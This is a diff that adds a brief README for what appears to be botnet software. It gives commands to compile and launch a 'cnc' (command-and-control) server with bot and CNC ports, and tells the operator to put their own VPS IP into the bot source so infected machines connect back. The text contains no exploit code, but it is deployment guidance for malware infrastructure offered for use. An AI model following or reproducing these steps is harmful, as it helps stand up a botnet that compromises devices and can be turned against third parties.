@@ -1,0 +1,17 @@
+# How to compile cnc?
+- Run this:
+
+-------------------------
+sh buildcnc.sh
+-------------------------
+
+- And run with
+
+-------------------------
+screen ./server <botport> <threads> <cncport>
+-------------------------
+
+
+# How to run bot?
+- You should change change ip in bot/main.c to your vps ip and bot port screened already
+- Cross auto shell is Unavailable now, soon in a later time
